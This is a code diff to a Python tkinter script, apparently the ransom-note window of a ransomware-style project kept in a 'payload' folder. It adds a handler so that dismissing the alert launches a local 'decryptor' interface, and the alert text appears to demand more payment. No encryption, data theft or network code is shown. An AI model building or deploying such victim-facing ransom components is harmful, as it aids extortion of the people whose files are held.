@@ -1,8 +1,38 @@
 import os
 import tkinter as tk
 from tkinter import messagebox
+import subprocess
 # Import Pillow modules to support JPEG files
 from PIL import Image, ImageTk
+
+def launch_decryptor():
+    """
+    Computes the path to the decryptor tool and launches it
+    as an independent background process.
+    """
+    # Find the absolute path of the current script (payload/)
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    
+    # Move up one level to the project root, then enter the decryptor folder
+    project_root = os.path.dirname(current_dir)
+    decryptor_path = os.path.join(project_root, "decryptor", "decryptor_ui.py")
+    
+    if os.path.exists(decryptor_path):
+        try:
+            # Launch decryptor_ui.py using the background system shell call
+            subprocess.Popen(["python", decryptor_path])
+        except Exception as e:
+            print(f"[-] Failed to launch decryptor process: {e}")
+    else:
+        print(f"[-] Path Error: Decryptor tool not found at {decryptor_path}")
+
+def on_acknowledge(root_window):
+    """
+    Callback wrapper triggered by the dismiss action button.
+    Closes the alert interface and transitions to the recovery utility.
+    """
+    root_window.destroy()  # Close the warning warning notification window
+    launch_decryptor()     # Instantly pivot open the CustomTkinter decryptor interface
 
 def show_alert_window():
     """
@@ -15,7 +45,7 @@ def show_alert_window():
     
     # Window Dimensions and Positioning
     window_width = 650
-    window_height = 680  # Adjusted to scale properly with the larger 350x350 thumbnail box
+    window_height = 680  
     
     # Calculate screen center
     screen_width = root.winfo_screenwidth()
@@ -88,7 +118,7 @@ def show_alert_window():
     )
     message_label.pack(pady=10)
 
-    # 4. Action Directive (Fixed string syntax error by adding a comma before the font definition)
+    # 4. Action Directive
     instruction_label = tk.Label(
         root,
         text="thore zyada bhejna 1 back bhi clear karni\n",
@@ -98,7 +128,7 @@ def show_alert_window():
     )
     instruction_label.pack(pady=5)
 
-    # 5. Dismiss Button
+    # 5. Dismiss & Transition Button
     close_button = tk.Button(
         root,
         text="Acknowledge",
@@ -110,7 +140,8 @@ def show_alert_window():
         bd=0,
         padx=20,
         pady=8,
-        command=root.destroy
+        # Redirect command execution through the window close and process fork handler
+        command=lambda: on_acknowledge(root)
     )
     close_button.pack(pady=(15, 0))
 
